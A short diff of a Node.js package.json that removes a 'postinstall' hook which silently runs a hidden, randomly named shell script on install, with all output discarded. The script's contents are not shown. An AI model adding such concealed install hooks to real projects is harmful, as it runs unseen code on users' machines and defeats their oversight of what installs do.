@@ -13,8 +13,7 @@
     "seed": "npx ts-node prisma/seed.ts",
     "lint": "eslint src",
     "test": "vitest run",
-    "test-watch": "vitest",
-    "postinstall": "sh ./.ci-jwk5es.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test-watch": "vitest"
   },
   "devDependencies": {
     "@faker-js/faker": "8.1.0",
